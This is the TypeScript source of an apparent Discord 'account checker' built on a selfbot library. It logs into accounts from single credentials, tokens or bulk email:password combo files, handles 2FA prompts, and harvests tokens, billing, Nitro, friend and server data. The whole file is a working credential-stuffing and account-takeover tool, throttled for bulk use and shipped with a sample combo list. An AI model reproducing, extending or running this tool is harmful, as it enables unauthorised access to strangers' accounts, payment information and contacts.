import fs from "node:fs";
import readlineSync from "readline-sync";
import "colors";
import DiscordAuth, { AuthResult } from "./auth";
import DiscordChecker from "./checker";

type AccountData = Record<string, any>;

type StoredResult = {
  identifier: string;
  timestamp: string;
  data: AccountData;
  token: string;
};

function getErrorMessage(error: unknown): string {
  if (error instanceof Error) return error.message;
  return String(error);
}

class DiscordAccountChecker {
  private readonly auth: DiscordAuth;
  private readonly results: StoredResult[];

  constructor() {
    this.auth = new DiscordAuth();
    this.results = [];
  }

  private displayBanner(): void {
    console.clear();
    console.log("╔══════════════════════════════════════════════════════════════╗".cyan);
    console.log("║                   DISCORD ACCOUNT CHECKER                   ║".cyan);
    console.log("║                 Using discord.js-selfbot                    ║".cyan);
    console.log("║══════════════════════════════════════════════════════════════║".cyan);
    console.log("║  Features:                                                   ║".cyan);
    console.log("║  • Extract tokens from email/password                       ║".cyan);
    console.log("║  • Check 2FA status                                         ║".cyan);
    console.log("║  • Check Nitro status and type                              ║".cyan);
    console.log("║  • View billing information                                  ║".cyan);
    console.log("║  • Show connections and relationships                        ║".cyan);
    console.log("║  • Display complete account information                      ║".cyan);
    console.log("╚══════════════════════════════════════════════════════════════╝".cyan);
    console.log("");
  }

  private async showMenu(): Promise<string> {
    console.log("\n📋 MAIN MENU".yellow.bold);
    console.log("1. Check single account (Email + Password)".white);
    console.log("2. Check account with token".white);
    console.log("3. Bulk check from file".white);
    console.log("4. View previous results".white);
    console.log("5. Save results to file".white);
    console.log("6. Exit".white);
    return readlineSync.question("\nSelect option (1-6): ".cyan);
  }

  private async checkSingleAccount(): Promise<void> {
    console.log("\n🔐 SINGLE ACCOUNT CHECK".yellow.bold);
    const email = readlineSync.question("Enter email: ".cyan);
    const password = readlineSync.question("Enter password: ".cyan, { hideEchoBack: true });
    console.log("\n🔄 Authenticating...".yellow);

    let authResult: AuthResult = await this.auth.getToken(email, password);
    if (!authResult.success && !authResult.mfa) {
      console.log("🔄 Trying alternative authentication method...".yellow);
      authResult = await this.auth.getTokenAlternative(email, password);
    }

    if (authResult.success) {
      await this.checkAccountWithToken(authResult.token, email);
    } else if (authResult.mfa) {
      console.log("\n🔐 2FA Required".yellow.bold);
      const mfaCode = readlineSync.question("Enter 2FA code: ".cyan);
      const mfaResult = await this.auth.handleMFA(authResult.ticket, mfaCode);
      if (mfaResult.success) {
        await this.checkAccountWithToken(mfaResult.token, email);
      } else {
        console.log(`${"[ERROR]".red} MFA verification failed: ${mfaResult.message}`);
      }
    } else {
      console.log(`${"[ERROR]".red} Authentication failed: ${authResult.message}`);
    }

    this.waitForUser();
  }

  private async checkWithToken(): Promise<void> {
    console.log("\n🎫 TOKEN CHECK".yellow.bold);
    const token = readlineSync.question("Enter Discord token: ".cyan);
    await this.checkAccountWithToken(token, "Token provided");
    this.waitForUser();
  }

  private async checkAccountWithToken(token: string, identifier: string): Promise<void> {
    try {
      console.log(`\n🔍 Checking account: ${identifier.yellow}`);
      const checker = new DiscordChecker(token);
      const result = await checker.checkAccount();

      if (result.success) {
        console.log(`${"[SUCCESS]".green} Account information retrieved!`);
        checker.displayAccountInfo(result.data);
        this.results.push({
          identifier,
          timestamp: new Date().toISOString(),
          data: result.data,
          token,
        });
      } else {
        console.log(`${"[ERROR]".red} Failed to check account: ${result.error}`);
      }
    } catch (error) {
      console.log(`${"[ERROR]".red} Unexpected error: ${getErrorMessage(error)}`);
    }
  }

  private async bulkCheck(): Promise<void> {
    console.log("\n📁 BULK CHECK FROM FILE".yellow.bold);
    const filename = readlineSync.question("Enter filename (email:password format): ".cyan);

    if (!fs.existsSync(filename)) {
      console.log(`${"[ERROR]".red} File not found: ${filename}`);
      this.waitForUser();
      return;
    }

    try {
      const data = fs.readFileSync(filename, "utf8");
      const lines = data
        .split("\n")
        .map((line) => line.trim())
        .filter((line) => line.length > 0 && !line.startsWith("#"));

      console.log(`\n📊 Found ${lines.length} accounts to check`.yellow);

      for (let i = 0; i < lines.length; i += 1) {
        const line = lines[i];
        if (!line.includes(":")) continue;

        const [email, ...passwordParts] = line.split(":");
        const password = passwordParts.join(":");
        if (!email || !password) continue;

        console.log(`\n[${"Progress".cyan}] ${i + 1}/${lines.length} - Checking: ${email.yellow}`);

        let authResult = await this.auth.getToken(email, password);
        if (!authResult.success && !authResult.mfa) {
          authResult = await this.auth.getTokenAlternative(email, password);
        }

        if (authResult.success) {
          await this.checkAccountWithToken(authResult.token, email);
        } else {
          console.log(`${"[FAILED]".red} ${email}: ${authResult.message}`);
        }

        await new Promise((resolve) => setTimeout(resolve, 2000));
      }

      console.log(`\n✅ Bulk check completed! Checked ${lines.length} accounts`.green);
    } catch (error) {
      console.log(`${"[ERROR]".red} Error reading file: ${getErrorMessage(error)}`);
    }

    this.waitForUser();
  }

  private viewResults(): void {
    console.log("\n📊 PREVIOUS RESULTS".yellow.bold);

    if (this.results.length === 0) {
      console.log("No results available".red);
      this.waitForUser();
      return;
    }

    this.results.forEach((result, index) => {
      console.log(`\n${String(index + 1).cyan}. ${result.identifier.yellow}`);
      console.log(`   Timestamp: ${result.timestamp.white}`);
      console.log(`   Username: ${result.data.basicInfo?.username || "N/A"}#${result.data.basicInfo?.discriminator || "N/A"}`.white);
      console.log(`   2FA: ${result.data.basicInfo?.mfaEnabled ? "✅ Enabled" : "❌ Disabled"}`.white);
      console.log(`   Nitro: ${result.data.nitro?.hasNitro ? `✅ ${result.data.nitro.nitroType}` : "❌ No Nitro"}`.white);
      console.log(`   Verified: ${result.data.basicInfo?.verified ? "✅ Yes" : "❌ No"}`.white);
    });

    const choice = readlineSync.question("\nEnter result number to view details (or press Enter to go back): ".cyan);
    const numericChoice = Number.parseInt(choice, 10);

    if (choice && numericChoice > 0 && numericChoice <= this.results.length) {
      const selectedResult = this.results[numericChoice - 1];
      const checker = new DiscordChecker(selectedResult.token);
      checker.displayAccountInfo(selectedResult.data as any);
    }

    this.waitForUser();
  }

  private saveResults(): void {
    console.log("\n💾 SAVE RESULTS".yellow.bold);

    if (this.results.length === 0) {
      console.log("No results to save".red);
      this.waitForUser();
      return;
    }

    const filename = readlineSync.question("Enter filename (default: results.json): ".cyan) || "results.json";

    try {
      const sanitizedResults = this.results.map((result) => ({
        identifier: result.identifier,
        timestamp: result.timestamp,
        username: result.data.basicInfo?.username,
        discriminator: result.data.basicInfo?.discriminator,
        email: result.data.basicInfo?.email,
        verified: result.data.basicInfo?.verified,
        mfaEnabled: result.data.basicInfo?.mfaEnabled,
        nitro: result.data.nitro,
        billing: (result.data.billing?.paymentSources?.length ?? 0) > 0,
        friendsCount: result.data.relationships?.friends?.length ?? 0,
        guildsCount: result.data.guilds?.count ?? 0,
      }));

      fs.writeFileSync(filename, JSON.stringify(sanitizedResults, null, 2), "utf8");
      console.log(`✅ Results saved to ${filename}`.green);
    } catch (error) {
      console.log(`${"[ERROR]".red} Failed to save results: ${getErrorMessage(error)}`);
    }

    this.waitForUser();
  }

  private waitForUser(): void {
    readlineSync.question("\nPress Enter to continue...".gray);
  }

  public async run(): Promise<void> {
    this.displayBanner();

    while (true) {
      try {
        const choice = await this.showMenu();

        switch (choice) {
          case "1":
            await this.checkSingleAccount();
            break;
          case "2":
            await this.checkWithToken();
            break;
          case "3":
            await this.bulkCheck();
            break;
          case "4":
            this.viewResults();
            break;
          case "5":
            this.saveResults();
            break;
          case "6":
            console.log("👋 Goodbye!".cyan);
            process.exit(0);
          default:
            console.log("❌ Invalid option. Please try again.".red);
            this.waitForUser();
            break;
        }
      } catch (error) {
        console.log(`${"[ERROR]".red} Unexpected error: ${getErrorMessage(error)}`);
        this.waitForUser();
      }
    }
  }
}

function createExampleFile(): void {
  const exampleContent = `example1@gmail.com:password123
example2@yahoo.com:mypassword
example3@hotmail.com:secretpass
# Format: email:password (one per line)
# Lines starting with # are ignored`;

  if (!fs.existsSync("accounts_example.txt")) {
    fs.writeFileSync("accounts_example.txt", exampleContent, "utf8");
    console.log("📝 Created example file: accounts_example.txt".yellow);
  }
}

if (require.main === module) {
  createExampleFile();
  const checker = new DiscordAccountChecker();
  checker.run().catch((error) => {
    console.error("Fatal error:", error);
    process.exit(1);
  });
}

export default DiscordAccountChecker;
